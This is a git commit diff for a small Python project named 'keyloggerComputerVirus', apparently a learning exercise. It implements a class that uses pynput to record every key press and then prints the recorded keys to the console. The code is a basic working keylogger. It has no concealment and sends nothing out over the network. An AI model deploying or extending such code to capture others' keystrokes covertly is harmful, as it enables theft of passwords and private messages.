3ce9fa5b0c69cbd391bb2c6d159fb8e711f754ef
isaac tunik <tunik.isaac@gmail.com>
2025-02-13 12:21:44 +0200

    vo1

--- keyloggerComputerVirus/IKeyLogger.py
+++ keyloggerComputerVirus/IKeyLogger.py
@@ -2,6 +2,7 @@ from abc import ABC, abstractmethod
 from typing import List
 
 
+
 class IKeyLogger(ABC):
     @abstractmethod
     def start_listening(self) -> None:
--- keyloggerComputerVirus/KeyLoggerService.py
+++ keyloggerComputerVirus/KeyLoggerService.py
@@ -1,12 +1,38 @@
+from pynput import keyboard
 from IKeyLogger import *
 
+
 class KeyLoggerService(IKeyLogger):
+    def __init__(self):
+        self.listening = None
+        self.key_presses = []
 
     def start_listening(self) -> None:
-        pass
+        if self.listening is None:
+            self.listening = keyboard.Listener(on_press=self.filter)
+            self.listening.start()
 
     def stop_listening(self) -> None:
-        pass
+        if self.listening is not None:
+            self.listening.stop()
+            self.listening = None
 
     def get_listen_keys(self) -> List[str]:
-        pass
+        return self.key_presses
+
+    def filter(self, key):
+
+            self.key_presses.append(key)
+
+
+
+
+if __name__ == "__main__":
+    logger = KeyLoggerService()
+    logger.start_listening()
+
+    #
+    input("Press Enter to stop listening...\n")
+    logger.stop_listening()
+
+    print("Logged keys:", logger.get_listen_keys())
